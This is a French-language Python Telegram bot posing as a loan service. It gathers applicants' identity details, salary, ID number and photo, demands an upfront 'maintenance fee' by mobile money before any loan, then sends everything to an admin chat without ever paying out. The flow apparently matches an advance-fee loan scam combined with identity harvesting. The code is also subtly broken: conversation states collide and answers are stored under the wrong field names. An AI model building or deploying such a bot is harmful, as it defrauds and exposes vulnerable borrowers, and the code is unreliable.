from telegram import Update, ReplyKeyboardRemove
from telegram.ext import (ApplicationBuilder, CommandHandler, MessageHandler,
                          ConversationHandler, ContextTypes, filters)
from config import BOT_TOKEN, ADMIN_CHAT_ID
from utils import calcul_frais_entretien, calcul_duree_remboursement

CHOIX_MONTANT, INFOS_PERSO, PAIEMENT = range(3)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Bienvenue sur le bot de prêt d'argent.\nEntrez le montant du prêt (entre 10.000 et 500.000 FCFA) :"
    )
    return CHOIX_MONTANT

async def choisir_montant(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        montant = int(update.message.text.replace('.', '').replace(' ', ''))
        if montant < 10000 or montant > 500000:
            raise ValueError
        context.user_data['montant'] = montant

        frais = calcul_frais_entretien(montant)
        delai = calcul_duree_remboursement(montant)

        await update.message.reply_text(
            f"Frais d'entretien : {frais} FCFA\n"
            f"Durée de remboursement : {delai} jours\n"
            "Remplissons le formulaire maintenant.\n"
            "Entrez votre nom complet :"
        )
        return INFOS_PERSO
    except ValueError:
        await update.message.reply_text("Montant invalide. Veuillez réessayer.")
        return CHOIX_MONTANT

async def infos_personnelles(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['nom_complet'] = update.message.text
    await update.message.reply_text("Date de naissance (jj/mm/aaaa) :")
    return INFOS_PERSO + 1

async def suite_formulaire(update: Update, context: ContextTypes.DEFAULT_TYPE):
    step = len(context.user_data) - 1
    champs = ['date_naissance', 'age', 'pays', 'telephone', 'travail', 'salaire', 'piece_id', 'photo']
    context.user_data[champs[step]] = update.message.text

    if step == 7:
        montant = context.user_data['montant']
        frais = calcul_frais_entretien(montant)
        await update.message.reply_text(
            f"Merci.\nVous devez payer {frais} FCFA de frais d'entretien pour continuer.\n"
            "Entrez votre numéro de téléphone pour payer (MTN ou Moov) :"
        )
        return PAIEMENT
    else:
        questions = [
            "Quel âge avez-vous ?", "Dans quel pays êtes-vous ?",
            "Votre numéro de téléphone :", "Quel est votre travail ?",
            "Combien gagnez-vous par mois ?", "Numéro de votre pièce d'identité :",
            "Envoyez une photo complète de vous :"
        ]
        await update.message.reply_text(questions[step])
        return INFOS_PERSO + 1

async def traitement_paiement(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['numero_paiement'] = update.message.text
    montant = context.user_data['montant']
    frais = calcul_frais_entretien(montant)

    await update.message.reply_text(
        f"Veuillez confirmer le paiement de {frais} FCFA sur votre téléphone maintenant.\n"
        "Une fois terminé, tapez 'OK' pour confirmer."
    )
    return PAIEMENT + 1

async def confirmation_finale(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text.strip().lower() != 'ok':
        await update.message.reply_text("Paiement non confirmé. Tapez 'OK' si vous avez payé.")
        return PAIEMENT + 1

    infos = context.user_data
    message = (
        f"Nouvelle demande de prêt :\n"
        f"Nom complet : {infos['nom_complet']}\nDate naissance : {infos['date_naissance']}\n"
        f"Age : {infos['age']}\nPays : {infos['pays']}\n"
        f"Téléphone : {infos['telephone']}\nTravail : {infos['travail']}\n"
        f"Salaire : {infos['salaire']}\nID : {infos['piece_id']}\n"
        f"Montant demandé : {infos['montant']} FCFA\nFrais payé : {calcul_frais_entretien(infos['montant'])} FCFA\n"
        f"Numéro paiement : {infos['numero_paiement']}"
    )
    await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=message)
    await update.message.reply_text("Votre demande a été soumise. Vous recevrez une réponse très bientôt.")
    return ConversationHandler.END

async def annuler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Opération annulée.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOIX_MONTANT: [MessageHandler(filters.TEXT & ~filters.COMMAND, choisir_montant)],
            INFOS_PERSO: [MessageHandler(filters.TEXT & ~filters.COMMAND, infos_personnelles)],
            INFOS_PERSO + 1: [MessageHandler(filters.TEXT & ~filters.COMMAND, suite_formulaire)],
            PAIEMENT: [MessageHandler(filters.TEXT & ~filters.COMMAND, traitement_paiement)],
            PAIEMENT + 1: [MessageHandler(filters.TEXT & ~filters.COMMAND, confirmation_finale)],
        },
        fallbacks=[CommandHandler("cancel", annuler)]
    )

    app.add_handler(conv)
    app.run_polling()

if __name__ == "__main__":
    main()